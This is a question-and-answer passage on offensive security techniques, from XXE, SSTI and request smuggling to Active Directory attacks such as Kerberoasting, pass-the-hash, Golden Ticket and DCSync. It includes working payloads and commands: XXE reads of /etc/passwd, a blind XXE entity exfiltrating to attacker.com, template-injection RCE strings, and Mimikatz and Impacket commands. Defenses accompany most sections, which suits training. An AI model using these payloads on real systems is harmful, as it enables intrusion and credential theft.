(3) Sealed sender: sender's identity encrypted to recipient's key; server cannot see who is sending to whom; only recipient can verify sender. Security properties: Forward secrecy: past messages safe even if long-term keys compromised; Post-compromise security: future messages safe after temporary device compromise; Deniability: messages do not prove who sent them (any party could have created them -- same as OTR protocol); Metadata leakage: server sees who communicates with whom and when (Sealed Sender partially mitigates); phone number required for registration (privacy limitation). Comparison: OTR (Off-the-Record): earlier protocol for XMPP; no asynchronous key establishment; Signal protocol supersedes OTR; iMessage uses non-forward-secret encryption by default; WhatsApp uses Signal protocol but centralized key distribution still trusted.
How do you exploit XXE (XML External Entity) vulnerabilities?

XXE (XML External Entity) injection: XML parsers process external entity references in DOCTYPE declarations; attacker-supplied entities can read local files, make server-side requests, or enable DoS. Basic XXE: POST XML request to server: <?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>; if server processes external entities and returns entity content, /etc/passwd contents returned in response. File read: file:///etc/passwd; file:///etc/shadow; file:///etc/hosts; file:///proc/self/environ (process environment variables -- may contain secrets); file:///proc/self/cmdline; application config files (file:///var/www/html/config.php, file:///home/app/.aws/credentials). SSRF via XXE: <!ENTITY xxe SYSTEM 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'>; server fetches internal URL; output in response; access metadata service or internal APIs. Blind XXE (no output): out-of-band data exfiltration via DNS or HTTP; two-stage: stage 1 entity fetches attacker-hosted DTD file; stage 2 DTD defines entity that exfiltrates file content to attacker via HTTP query parameter: <!ENTITY % file SYSTEM 'file:///etc/passwd'><!ENTITY % exfil '<!ENTITY send SYSTEM 'http://attacker.com/?x=%file;'>'>%exfil; Burp Collaborator for OOB detection. XXE via file upload: upload SVG (contains XML) with XXE payload; Office XML formats (docx = ZIP of XML files) -- place payload in document.xml; XLSX entity injection; server processes uploaded file, triggers XXE. DoS (Billion Laughs): nested entity expansion: <!ENTITY lol 'lol'><!ENTITY lol1 '&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;'> (10 lol entities); each level multiplies 10x; 6 levels = 10^6 entities; parser uses gigabytes of memory; crash server. Defense: disable external entity processing in XML parser (the default in most modern parsers); FEATURE_DISALLOW_DOCTYPE_DECL for Java SAXParser; libxml2 LIBXML_NOENT flag disabled; avoid XML for user input when JSON possible.
What are HTTP request smuggling vulnerabilities?

HTTP request smuggling: exploit discrepancy between how frontend proxy and backend server parse HTTP request boundaries; frontend sees one request, backend sees two -- attacker smuggles extra request that poisons next victim's request. Background: HTTP/1.1 allows two headers to specify request body length: Content-Length (CL): number of bytes in body; Transfer-Encoding chunked (TE): body split into chunks, each prefixed with hex size, terminated with 0\r\n\r\n. Vulnerability: if frontend and backend disagree on which header takes precedence: CL.TE (frontend uses CL, backend uses TE): send request with both headers; frontend forwards entire body based on CL; backend processes chunked body, sees extra data after 0 chunk as beginning of next request; that extra data prepended to next user's request -- request poisoning. TE.CL (frontend uses TE, backend uses CL): opposite discrepancy; similar impact. TE.TE (both support TE but one can be confused with obfuscated header): Transfer-Encoding: xchunked, Transfer-Encoding : chunked -- one processes, other ignores; similar to CL.TE. Impact: (1) Bypass front-end security controls: WAF/ACL rules applied at frontend; smuggled request hits backend directly; bypass IP whitelisting, authentication, URL-based ACLs. (2) Capture victim requests: smuggle partial request; next victim's request appended; victim's headers (cookies, auth tokens) captured in attacker-accessible location (comment in blog post, user profile). (3) Reflected XSS via smuggling: inject XSS payload in smuggled request; reflected in subsequent user's response. (4) Perform web cache deception: poison cache with victim's authenticated response accessible to unauthenticated attacker. Detection: Burp Suite HTTP Request Smuggler extension automates; manual: send timed requests using CL.TE and observe delays. Defense: normalise ambiguous requests at frontend; disable backend connection reuse; use HTTP/2 end-to-end (H2 has single length mechanism).
How do you perform OAuth 2.0 security testing?

OAuth 2.0 security testing: OAuth = authorisation framework; OpenID Connect (OIDC) = identity layer on OAuth. Flows: Authorization Code (recommended): client redirects to auth server; user authenticates; auth server redirects with code; client exchanges code for token; Implicit flow (deprecated): token returned directly in URL fragment -- token in browser history, logs; PKCE (Proof Key for Code Exchange): public clients use code challenge to prevent code interception. Attack surface: (1) CSRF on authorisation endpoint: if state parameter missing or not validated: attacker initiates auth flow; sends crafted redirect to victim; victim completes flow; attacker's code used with victim's account (account hijacking). State parameter: random nonce tied to session; validated after redirect; essential CSRF protection. (2) Open redirect in redirect_uri: if redirect_uri not strictly validated: redirect_uri=https://attacker.com; after auth, code sent to attacker; exchange for tokens; account takeover. Tests: try different values (change directory: /callback/../attacker; add extra path; URL encoding bypass). (3) Token leakage via Referer: authorization code or access token in URL; Referer header leaks to third-party resources loaded on redirect page. (4) Authorization code interception: if code lifetime too long (>10 min) and not single-use: replay code from logs, Referer. (5) Insufficient scope validation: client requests scope A; attacker sends modified request for scope admin; if server doesn't validate requested scopes against registered scopes. (6) Client credential storage: mobile apps bundle client_secret in app (reversible); extract via Jadx/apktool; use client credentials to impersonate client. (7) JWT vulnerabilities in access tokens: alg:none; weak secret; key confusion (RS256 to HS256 with public key as secret). (8) Token reuse across clients: if token audience not validated: steal token from one application, use against another. Tool: Burp Suite + OAuth extension; test state parameter, redirect_uri, scope, PKCE implementation.
How do you exploit GraphQL APIs?

GraphQL security testing: GraphQL = API query language; flexible, powerful, different attack surface than REST. (1) Introspection: {__schema{types{name fields{name}}}} or {__schema{queryType{fields{name args{name}}}}}; if introspection enabled (default on most frameworks), reveals entire API schema -- all types, queries, mutations; disabled in production on some platforms but easily overlooked. Introspection as recon: identify all available operations; find admin/debug queries not intended for public; discover object IDs and field names. (2) Field suggestion: if introspection disabled, use field typos (GraphQL returns suggestions for similar fields) -- send query with misspelled field; error response suggests real field name; map schema without introspection. (3) Batching attack: GraphQL supports multiple queries in single request -- query batching; send 1000 login attempts in one batch request; rate limiting per-request not per-query ineffective; brute force login credentials; bypass OTP rate limiting. (4) Query depth and complexity: deeply nested queries (user{friends{friends{friends{friends{...}}}}}); without depth limiting, exponential database queries; DoS. Complexity limiting mitigates. (5) IDOR in GraphQL: change node ID (user(id: 456) where you should only access id 123); same IDOR as REST but in query structure. (6) Injection in resolver: if resolver passes query argument to database or OS without sanitisation: {user(name: John; DROP TABLE users;)} for SQL injection; command injection if args used in OS commands. (7) Broken authentication: mutations (createUser, updatePassword) may lack authentication checks; test all mutations without authentication. (8) Subscription websocket: real-time data via websocket; subscribe to events for other users; missing authorisation on subscription filters. Tools: InQL (Burp extension -- introspection, query generation); graphql-voyager (visualise schema); graphw00f (fingerprint GraphQL engine); Clairvoyance (introspection without introspection query using field suggestion).
What are prototype pollution attacks in JavaScript?

Prototype pollution: JavaScript vulnerability where attacker modifies Object.prototype; all objects inherit from Object.prototype; polluting it affects all objects in application. How it works: JavaScript property lookup traverses prototype chain; if property not found on object, checks __proto__, then Object.prototype; attacker sends JSON: {__proto__:{isAdmin:true}} or {constructor:{prototype:{isAdmin:true}}}; if application merges this without sanitisation (lodash.merge, jQuery.extend, recursive deep merge) -- Object.prototype.isAdmin = true; every object in application now has isAdmin property. Vulnerable merge pattern: function merge(target, source) { for (let key of Object.keys(source)) { if (typeof source[key] === 'object') { merge(target[key], source[key]); } else { target[key] = source[key]; } } } -- does not check for __proto__ key. Impact -- server-side (Node.js): Remote Code Execution via AST injection (Pug, EJS template engines); code gadgets in application that use polluted properties for dangerous operations; privilege escalation (isAdmin check). Impact -- client-side: XSS if polluted property injected into sink (innerHTML, eval); logic bypass (feature flags controlled by property existence). Detection: send JSON payload with __proto__ property and check if it reflects in Object.prototype check; Burp extension for prototype pollution detection; tool: PPScan, server-side-prototype-pollution (NodeJS testing). Defense: use JSON.parse (safe) instead of recursive merge; Object.create(null) for key-value maps (no prototype chain); Map instead of plain objects; lodash 4.17.21+ fixed; validate and reject __proto__, constructor, prototype as keys; use Object.freeze(Object.prototype) at application start.
How do you perform passive and active reconnaissance?

Reconnaissance methodology: intelligence gathering before active exploitation. Passive recon (no direct contact with target): WHOIS: whois domain.com (registrant info, nameservers, registrar, registration date; GDPR reduced PII in public WHOIS); historical WHOIS via ViewDNS.info. DNS: dig domain.com ANY (A, MX, NS, TXT records); dig domain.com TXT (SPF, DKIM, DMARC -- reveal email providers, cloud services); subfinder, amass, assetfinder, sublist3r for subdomain enumeration; certificate transparency (crt.sh -- find subdomains from issued TLS certificates). Search engines: Google dorks: site:domain.com filetype:pdf; site:domain.com ext:sql; site:domain.com intitle:login; inurl:admin site:domain.com; Shodan.io: indexed internet-facing devices; search for target IP range or domain; finds open ports, service banners, default credentials, exposed cameras/routers/ICS. OSINT: LinkedIn (employee names, roles, technologies used in job descriptions -- reveals tech stack); Glassdoor (interview questions reveal internal tools); GitHub (leaked credentials, internal tools, API keys in public repos); pastebin sites (leaked data, credentials); Wayback Machine (old pages, old code, old configuration files); SecurityTrails (passive DNS, historical data). Active recon (direct contact with target): Port scanning: nmap -sS -p 1-65535 -T4 target (TCP SYN scan all ports); nmap -sU -p 53,67,69,123,161,500 target (UDP key ports); version detection: nmap -sV (service version); OS detection: nmap -O. Web application fingerprinting: whatweb target.com (technology detection); wappalyzer browser extension; check HTTP headers (X-Powered-By, Server, X-Generator); Burp Scanner for passive tech detection. Directory enumeration: gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt; ffuf -w wordlist.txt -u http://target.com/FUZZ; find admin panels, backup files, git repos, config files.
What is Red Team versus Blue Team and how do Purple Team exercises work?

Red Team vs Blue Team: Red Team: offensive security team simulating real-world threat actors; tests organisation defenses by attempting to breach systems using APT-level TTPs; go undetected as long as possible; achieve specific objectives (reach domain admin, exfiltrate sensitive data, demonstrate lateral movement to crown jewels); follows MITRE ATT&CK framework; uses realistic TTPs of relevant threat actors. Blue Team: defensive security team; monitors and detects threats; maintains SIEM, EDR, IDS/IPS, firewalls; responds to incidents; hardening, patching, vulnerability management; conducts threat hunting; operates SOC. Red Team engagement types: Assumed Breach: start inside network (simulates insider threat or successful phishing); Full Attack Simulation: external to internal; Objective-based: reach specific target (steal specified file, access HR system); Crown Jewels: test specific high-value asset protection. Purple Team: collaborative exercise where Red and Blue work together simultaneously; Red performs techniques; Blue observes whether detected; tune detections in real time; focus: maximize detection coverage and defense maturity rather than proving Blue Team failed. Purple Team benefits: direct knowledge transfer from Red to Blue; Blue learns specific attacker techniques; Red learns defender visibility gaps; MITRE ATT&CK coverage analysis before/after; faster detection improvement than black-box Red Team; CIRT readiness improvement. Red Team tools: Cobalt Strike (commercial C2 framework); Sliver (open-source alternative); Havoc (newer open-source); Brute Ratel (commercial); custom implants. Reporting: Red Team report includes: objectives achieved; attack narrative; MITRE ATT&CK techniques used; detection/alert gaps; dwell time (how long undetected); recommendations for Blue Team; Purple Team report maps each TTP to detection status and remediation.
How do you attack and assess thick client desktop applications with Electron?

Electron: framework for building cross-platform desktop apps using Node.js and Chromium; applications built with HTML/CSS/JavaScript with full Node.js access; popular apps: Slack, VSCode, Discord, Atom, Teams. Attack surface: (1) nodeIntegration: if nodeIntegration: true in BrowserWindow webPreferences: any XSS in renderer becomes RCE (can call require() to access Node.js built-ins); attack: XSS in any web content loaded -> require('child_process').exec('calc.exe'). (2) contextIsolation: false: renderer and main process share JavaScript context; if false + any XSS -> access to ipcRenderer and other Electron APIs for privilege escalation to main process. (3) ASAR archive analysis: Electron apps bundle code in.asar archive (JSON-indexed tar format); extract: npx asar extract app.asar extracted/; review JavaScript source for hardcoded credentials, API keys, internal endpoints, security controls; ASAR not encrypted by default. (4) Auto-update mechanism: if update URL/signature verification missing: MITM to serve malicious update; insecure update server (HTTP or unsigned packages). (5) IPC message injection: main process exposes IPC handlers (ipcMain.on) for renderer calls; if renderer has XSS: call ipcRenderer.send('dangerous-operation', payload); if main process handler does not validate source or sanitise arguments: arbitrary file write/execution through main process. (6) Custom protocol handlers: Electron registers custom protocol (app://); deep links invoke app with attacker-controlled parameters; if protocol handler uses parameters unsafely. (7) Web content loading: if app loads external URLs with high privileges (nodeIntegration enabled, shell.openExternal misuse). Testing: extract ASAR; review webPreferences for nodeIntegration, contextIsolation, sandbox flags; run app, open DevTools (help menu or Ctrl+Shift+I if not disabled); attempt XSS in any user-controllable field; check network traffic for update mechanism; review IPC handlers for injection. Defense: contextIsolation: true; nodeIntegration: false; sandbox: true; preload script exposes limited API via contextBridge; validate all IPC messages.
How do you perform SMB relay attacks?

SMB relay: capture NTLM authentication challenge and relay it to another host to authenticate as victim; does not require cracking hash. Requirements: SMB signing disabled on target (default on workstations; required on DCs); victim authenticates to attacker (social engineering, LLMNR/NBT-NS poisoning, or pre-planted link). Setup with Responder + ntlmrelayx: terminal 1: responder -I eth0 --no-smb-server --no-http-server (capture hashes but disable SMB/HTTP server so relay tool handles); terminal 2: ntlmrelayx.py -tf targets.txt -smb2support (relay to hosts in targets list). Forcing authentication: LLMNR/NBT-NS poisoning: when Windows host cannot resolve name via DNS, broadcasts LLMNR (UDP 5355) and NBT-NS (UDP 137); Responder answers claiming to be any host; victim sends NTLMv2 hash; relay or crack. Sharphound: if DNS resolution fails for UNC path in Office macro or URL file, Windows broadcasts LLMNR -- attacker answers and gets hash. Coerce authentication: printerbug (SpoolSS bug): target host contacts attacker via SMB to send printer notification; forces NTLM auth; PetitPotam (MS-EFSRPC): unauthenticated MS-EFSRPC call forces target to authenticate to attacker; Coercer tool automates many coercion techniques. ntlmrelayx actions: if no credential: dump SAM (local credential store); if LDAP relay (use -t ldap://DC): add user to Domain Admins, dump LDAP, create computer account; if WebDAV target: NTLM relay to HTTP (WebDAV responder intercepts). Mitigation: enable SMB signing (GPO: Microsoft network server: Digitally sign communications always = Enabled); disable LLMNR (GPO: Turn off multicast name resolution); disable NBT-NS (NIC TCP/IP settings, disable NetBIOS over TCP/IP); enable EPA (Extended Protection for Authentication) on LDAP.
How do you attack Kerberos with Kerberoasting?

Kerberoasting: request Kerberos service tickets for services running under domain accounts; tickets encrypted with service account NTLM hash; crack offline to get plaintext password. Prerequisites: any domain user account (low privilege); target service accounts must have SPN (Service Principal Name) set. Steps: (1) Enumerate SPNs: GetUserSPNs.py -dc-ip DC_IP domain/user:pass (Impacket); or PowerShell: setspn -T domain -Q */* | Select-String domain (filter for domain accounts vs computer accounts). (2) Request service ticket: GetUserSPNs.py -dc-ip DC_IP domain/user:pass -request (returns Kerberos TGS tickets in hashcat format). (3) Crack tickets: hashcat -m 13100 tickets.txt rockyou.txt (Kerberos TGS-REP etype 23 = RC4 = hashcat mode 13100); hashcat -m 19600 tickets.txt rockyou.txt (AES-128 = 19600; AES-256 = 19700 -- harder to crack). Impact: if service account is highly privileged (SQL Server running as domain admin -- common misconfiguration): crack password = domain admin access. Why offline: TGS ticket is encrypted with service account hash; no lockout during offline cracking; attacker can crack at leisure. Why effective: service account passwords often old (set once, never changed), simple (set by sysadmin following pattern), and accounts often in high-privilege groups. Defenses: managed service accounts (gMSA -- Group Managed Service Accounts): Windows automatically manages and rotates passwords (240-char random); incompatible with legacy apps. Strong passwords for service accounts: 25+ character random password; will crack offline but time to crack decades. AES-only: configure service accounts to require AES Kerberos; TGS encrypted with AES-256; slower to crack but not impossible with weak passphrase. Detection: Windows Event 4769 (TGS requested) for sensitive service accounts; spike in 4769 events from single workstation = Kerberoasting; filter for Ticket Encryption Type 0x17 (RC4 -- weaker, more crackable).
Explain Pass-the-Hash and how to defend against it.

Pass-the-Hash (PtH): use stolen NTLM hash directly for authentication without knowing plaintext password; NTLM authentication protocol accepts hash directly; no need to crack. How it works: attacker compromises system; dumps NTLM hashes (Mimikatz: sekurlsa::logonpasswords or lsadump::sam); hash used for NTLM authentication: impacket: smbexec.py domain/admin@TARGET -hashes :NTLM_HASH; pth-winexe command on Linux; crackmapexec: cme smb TARGET -u admin -H NTLM_HASH --exec-method smbexec. Obtaining hashes: LSASS memory (Mimikatz, ProcDump + offline extraction, Task Manager dump); SAM database (reg save HKLM\SAM C:\sam, reg save HKLM\SYSTEM C:\system; secretsdump.py on saved files); domain controller NTDS.dit (ntdsutil snapshot; Volume Shadow Copy; DCSync from domain admin). DCSync attack (Mimikatz): lsadump::dcsync /domain:corp.local /user:Administrator; replicates DC sync to get NTLM hash without touching LSASS; requires Domain Admin or specific AD replication rights. PtH scope: any system where the compromised hash has local admin access; collect hashes from one machine; use against all machines where same local admin password hash = same hash (credential reuse). Defence: Credential Guard (Windows 10+): stores NTLM hashes and Kerberos tickets in Isolated LSA (Hyper-V virtualization-based security); prevents Mimikatz from reading credentials from LSASS; requires UEFI Secure Boot, TPM, VBS. LAPS: unique random local admin passwords per machine; PtH one machine does not grant access to others via local admin. Privileged Access Workstations: admins authenticate with smartcard (certificates); NTLM disabled for admin accounts; use Kerberos with strong pre-auth only. Disable NTLM entirely (NTLMv1 first, then NTLMv2): use Kerberos only; some legacy applications break; Windows Defender Credential Guard enforces this for protected accounts. Account tiering: Tier 0 accounts (domain admins) never log into Tier 2 systems; hashes never exposed on workstations.
How does Golden Ticket attack work?

Golden Ticket: forge Kerberos Ticket Granting Ticket (TGT) with arbitrary privileges using krbtgt account NTLM hash; tickets signed with krbtgt hash; no check against AD -- any claims in ticket accepted by DCs. Prerequisites: krbtgt NTLM hash (obtained via DCSync, NTDS.dit extraction, or domain admin Mimikatz on DC); domain SID (whoami /user shows SID on domain-joined machine; subtract RID to get domain SID). Ticket creation: Mimikatz: kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-[...] /krbtgt:NTLM_HASH /ptt (inject into memory); sets ticket expiry to 10 years by default; username can be anything (including non-existent user). Using ticket: kerberos::list (list tickets in memory); dir \\DC01\C$ (access DC admin share with forged TGT); psexec \\DC01 cmd (execute commands on DC). Inter-realm: if trust exists between domains: golden ticket for child domain with /sids: SID of Enterprise Admins in parent domain; pivot from child to parent domain (SID history attack). Detection: Event 4769 (TGS request) from user who is not in DC 4624 logon event (user authenticated with TGT but no logon event for account); PAC validation anomalies; ticket expiry > 10 hours (max set by domain policy); OPSEC: use /endin:480 /renewmax:10080 (normal 8h/7d limits) to blend with legitimate tickets. Defense: krbtgt password reset: reset krbtgt password TWICE (two resets required because AD keeps previous password for ongoing ticket validation); invalidates all outstanding TGTs; disruptive (reauthentication required); done after confirmed domain compromise; automated with krbtgt reset tools (Microsoft script). Monitor krbtgt account: alert on any login as krbtgt (never legitimate login); alert on DCSync replication (Event 4662 with 1131f6ab or 1131f6aa access rights on domain object).
Explain DCSync attacks and how to prevent them.

DCSync: use legitimate Active Directory replication mechanism to extract password hashes from domain without touching LSASS; simulates domain controller replication request. Background: AD replication: DCs replicate objects between each other; use MS-DRSR protocol; GetNCChanges call requests changes to directory objects; includes password hashes for replication. Required rights: DS-Replication-Get-Changes (Replicating Directory Changes); DS-Replication-Get-Changes-All (Replicating Directory Changes All) -- needed for sensitive attributes including password hashes; by default: Domain Admins, Enterprise Admins, Domain Controllers have these rights. Execution: Mimikatz: lsadump::dcsync /domain:corp.local /user:krbtgt (get krbtgt hash); lsadump::dcsync /domain:corp.local /all /csv (dump all accounts -- avoid on production; creates significant AD load and logging). Impacket: secretsdump.py domain/admin@DC_IP (automatically uses DCSync if admin has rights; falls back to NTDS.dit extraction). Why valuable: stealthier than running Mimikatz on DC (no need to execute code on DC); works from any domain-joined machine with appropriate rights; krbtgt hash enables Golden Ticket; NTDS.dit equivalent output. Delegated DCSync rights: if a non-admin account (service account, misconfigured account) has replication rights: can DCSync without domain admin; often set accidentally or by third-party backup software on domain OU. Bloodhound detects: DCSync privileges shown in BloodHound graph; GenericAll or WriteDACL on domain object can grant self DCSync rights. Detection: Event 4662 (object access) on domain root object with properties 1131f6aa (DS-Replication-Get-Changes) or 1131f6ab (DS-Replication-Get-Changes-All); filter: account type not Domain Controller (DC machine accounts legitimately replicate); non-DC machine performing replication = DCSync. Mitigation: audit who has Replicating Directory Changes permissions; remove from non-DC accounts; configure SACL on domain object to log access; Privileged Identity Management controls.
How do you use BloodHound for Active Directory attack path analysis?

BloodHound: tool for visualising and analysing Active Directory attack paths; uses graph theory to find unintended privilege escalation routes. Components: SharpHound (or BloodHound.py): data collector; runs on domain-joined machine or from attack host with creds; enumerates: users, groups, computers, GPOs, OUs, sessions (who logged into where), ACLs, trusts, local group membership; uploads JSON files to BloodHound. Neo4j: graph database backend; BloodHound GUI connects and visualises. Data collection: SharpHound.exe --CollectionMethod All (full collection; requires domain user); BloodHound.py -u user -p pass -d domain.local -dc DC01 -c All (Python version from Linux). Cypher queries: BloodHound GUI has pre-built queries; Find Shortest Paths to Domain Admins; Find Principals with DCSync Rights; Find Computers where Domain Users are Local Admin; Find Shortest Path from this computer to Domain Admin. Custom queries: MATCH p=shortestPath((u:User {name:'JSMITH@CORP.LOCAL'})-[*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'})) RETURN p. Attack paths: GenericAll/GenericWrite on user: force password reset or set SPN for Kerberoasting; WriteDACL on group: grant yourself membership; Owns: complete control over object; ForceChangePassword: reset password without knowing current; AllowedToDelegate (Constrained Delegation): impersonate any user to delegated service; AllowedToAct (RBCD Resource-Based Constrained Delegation): if write access to msDS-AllowedToActOnBehalfOfOtherIdentity on computer object: abuse RBCD for lateral movement. Session analysis: who logged into what; domain admin sessions on non-tier-0 machines; pivot to machines with admin sessions. BloodHound Enterprise: commercial version with continuous collection and attack path risk scoring; maps paths from attack surface (internet-exposed systems) to crown jewels. Hardening with BloodHound: identify and remove paths; tiered admin model to eliminate cross-tier paths; remove unnecessary ACL relationships.
What are common Active Directory misconfigurations attackers exploit?

Top Active Directory attack surface misconfigurations: (1) Unconstrained Delegation: computer or user account has Trust this computer for delegation to any service (Kerberos only); when any user authenticates to service on that machine, their TGT is saved; if attacker compromises machine with unconstrained delegation: wait for domain admin to authenticate (coerce with PetitPotam/PrinterBug) or wait passively; extract TGT from LSASS; use TGT as that user anywhere. (2) Constrained Delegation: machine/user can delegate to specific services; if account has SPN set and TrustedToAuthForDelegation (Protocol Transition): S4U2Self (service for user to self) allows impersonating any user to self; S4U2Proxy then delegates to target service; combine: request TGS as any user (even domain admin) to target service. (3) RBCD (Resource-Based Constrained Delegation): if attacker can write to msDS-AllowedToActOnBehalfOfOtherIdentity attribute on computer object (GenericWrite, GenericAll, WriteProperty): configure computer to trust attacker-controlled machine for delegation; use S4U2Self + S4U2Proxy to get service ticket as any user to that computer. (4) AD CS (Active Directory Certificate Services) misconfigurations (ESC1-ESC8): ESC1: vulnerable certificate template allows SAN (Subject Alternative Name) -- enrol certificate claiming to be any user including domain admin; use certificate for domain admin Kerberos authentication (PKINIT). ESC6: CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag -- similar to ESC1 but applies to all templates. (5) AdminSDHolder abuse: AdminSDHolder object protects privileged group members with fixed ACL; if attacker modifies AdminSDHolder ACL: propagated to all protected objects every 60 minutes; persistent access. (6) Over-permissive ACLs: GenericAll on OU gives full control over all objects in OU; WriteDACL on domain gives ability to grant self DCSync rights. (7) Print Spooler service running on DCs: enables PrinterBug coercion of DC to authenticate to attacker; disable Spooler service on DCs.
How do you attack MSSQL servers in a penetration test?

MSSQL attack techniques: Enumeration: nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell target; metasploit: auxiliary/scanner/mssql/mssql_ping; msf: auxiliary/scanner/mssql/mssql_login (brute force). Authentication methods: SQL authentication (sa account -- often enabled and weakly configured on older instances); Windows authentication (AD accounts); attempt sa login with blank password, sa/sa, sa/password; if sa accessible: instant xp_cmdshell access. xp_cmdshell: stored procedure executes OS commands as SQL Server service account; EXEC xp_cmdshell 'whoami'; disabled by default in SQL Server 2005+; re-enable: EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; then EXEC xp_cmdshell 'net user /domain'. Linked servers: MSSQL supports linked servers (trust between SQL Server instances); SELECT * FROM OPENQUERY(LINKED_SERVER, 'SELECT SYSTEM_USER') (execute queries on linked server); if linked server runs as SA: xp_cmdshell via linked server; SELECT * FROM OPENQUERY(LINKED_SERVER, 'EXEC xp_cmdshell ''whoami'''); chain of linked servers can traverse network. SQL injection to OS command: if SA or DBO: stack queries with; xp_cmdshell 'cmd'; combined with SQLi for RCE. Credential extraction: SELECT name, password_hash FROM sys.sql_logins (SA hash); crack with hashcat mode 1731 (MSSQL); SELECT credential_identity, credential_secret FROM sys.credentials (linked server creds). Privilege escalation from SQL: if SQL service runs as SYSTEM (common misconfiguration): xp_cmdshell = instant SYSTEM shell; impersonate login: EXECUTE AS LOGIN = 'sa' (if caller has impersonate privilege). Tools: Impacket mssqlclient.py domain/user:pass@TARGET -windows-auth; PowerUpSQL (PowerShell module for MSSQL auditing and exploitation); metasploit mssql modules.
How does Cobalt Strike work and how do defenders detect it?

Cobalt Strike: commercial adversary simulation framework (legitimate red team tool, widely abused by threat actors); Command and Control (C2) framework for post-exploitation. Architecture: Teamserver: runs on attacker C2 server; manages beacons; collaborative (multiple operators). Beacon: implant on victim machine; communicates with teamserver. Listener: configured on teamserver; defines protocol (HTTP/S, DNS, SMB, TCP) and C2 server domain. Beacon types: Beacon HTTP/HTTPS: polls C2 URL at configurable interval (default 60s); returns tasks; executes in memory. Beacon DNS: communicates over DNS queries; stealthy; slower. Beacon SMB: named pipe communication; used for lateral movement (parent beacon manages child beacons over SMB). Stage0/Stage1/Stageless: HTTP beacon stages: stager (small shellcode fetches full payload); stageless: full payload delivered immediately. Malleable C2 profiles: Cobalt Strike allows customising HTTP request/response format (headers, URIs, transforms) to mimic legitimate traffic (Akamai, Amazon, SharePoint); defeats signature-based network detection. Capabilities: process injection; PPID spoofing; sleep with obfuscation; execute-assembly (run.NET assembly in memory); Powerpick (PowerShell without powershell.exe -- bypasses Script Block Logging); Spawn-to (fork and run in sacrificial process); SOCKS proxy; VPN mode; Kerberos attacks; lateral movement (psexec, winrm, wmi). Detection: JA3 hash of Cobalt Strike beacon TLS (72a7c13d8cc8cbc4e69a1f1e14d9ae9f -- default profile; malleable profile changes this); beacon sleep jitter patterns; staging requests (/____) or common Cobalt Strike default URIs; named pipes (\.\pipe\MSSE-####-server); YARA signatures for beacon payload in memory; Cobalt Strike default profile metadata in JARM fingerprint; network canary domains triggering on default Cobalt Strike C2 profiles. Public OSINT: Shodan query for Cobalt Strike team servers; SSL certificate subject OU=OfflineCA; cert/ssl.cert.subject.cn: matching teamserver patterns; geolocation of C2 infrastructure.
How do you exploit Server-Side Template Injection (SSTI)?

SSTI: user input embedded directly into template engine; template engine executes injected expressions; can lead to RCE. Detection: send {{7*7}} in user input fields; if response contains 49: template injection confirmed; try ${7*7} (Jinja2/Mako variation); <%= 7*7 %> (ERB/EJS). Engine identification: Tplmap tool automates detection and engine fingerprinting; manually: try engine-specific syntax; {{7*'7'}} returns 7777777 in Jinja2 (Python string multiplication) vs 49 in Twig (PHP); different error messages also fingerprint engines. Jinja2 (Python): {{config}} (dumps Flask app configuration including SECRET_KEY); {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}} (RCE via Python builtins access); shorter via class traversal: {{''.__class__.__mro__[1].__subclasses__()[40]('id',shell=True,stdout=-1).communicate()}} (find subprocess class). Twig (PHP): {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}} (RCE via filter callback). Freemarker (Java): <#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')} (RCE via Execute class). Thymeleaf (Java): __${T(java.lang.Runtime).getRuntime().exec('id')}__::.x (SpEL expression injection). Pebble (Java): {% set path = '/etc/passwd' %}{% include path %} (file include). Smarty (PHP): {php}echo system('id');{/php} (native PHP code execution). Impact: RCE as web application user; read server files; server-side request forgery; credential theft from app config. Bypass sandboxing: Jinja2 sandbox bypass via restricted subclasses; find unrestricted class in subclass list; generally sandboxing is bypassable with enough effort. Tools: Tplmap (automated SSTI exploitation tool); Burp Suite scanner detects some SSTI patterns. Defence: never pass user input directly to template render function; use parameterised templates; enforce strict sandbox if engine supports it; Jinja2: Environment(sandbox=True) -- limited protection.
How do you test for CORS misconfiguration vulnerabilities?

CORS (Cross-Origin Resource Sharing): browser mechanism allowing server to permit cross-origin requests; extends browser same-origin policy. How CORS works: browser sends preflight OPTIONS request with Origin header; server responds with Access-Control-Allow-Origin (ACAO) header; if ACAO includes requester origin, browser allows response access; Access-Control-Allow-Credentials: true allows cross-origin request to include cookies. Misconfiguration testing: send request with Origin: attacker.com; if ACAO: attacker.com returned (reflected origin) AND Access-Control-Allow-Credentials: true -- vulnerable; attacker can make authenticated cross-origin requests from evil domain and read responses. Vulnerability: ACAO reflects arbitrary Origin: some servers just echo back whatever Origin header they receive; exploit: host simple JavaScript on attacker.com; victim visits; JS makes fetch('https://api.target.com/account', {credentials:'include'}) -- browser includes victim's session cookie; server responds with ACAO: attacker.com; Access-Control-Allow-Credentials: true; JS reads response (contains account data/token); exfiltrate to attacker. Null origin: ACAO: null + credentials; HTML5 sandboxed iframe generates null origin; attacker uses sandboxed iframe to send requests with Origin: null header; bypass whitelist. Subdomain bypass: ACAO: *. pattern (ACAO: https://*.target.com allows any subdomain); if any subdomain of target.com is XSS-vulnerable: use that subdomain as origin for requests to main API; exfiltrate sensitive data. Localhost CORS: ACAO: http://localhost:3000 for internal tool; if victim has local tool on same port: cross-origin access via browser. Testing methodology: modify Origin header in all authenticated API requests; look for reflection in ACAO; check Access-Control-Allow-Credentials header; test null origin; test subdomain patterns. Automated: Corsy (Python tool for automated CORS misconfiguration detection); Burp passive scanner. Fix: whitelist specific trusted origins; do not reflect Origin header blindly; never use wildcard with credentials.
Explain clickjacking attacks and defenses.

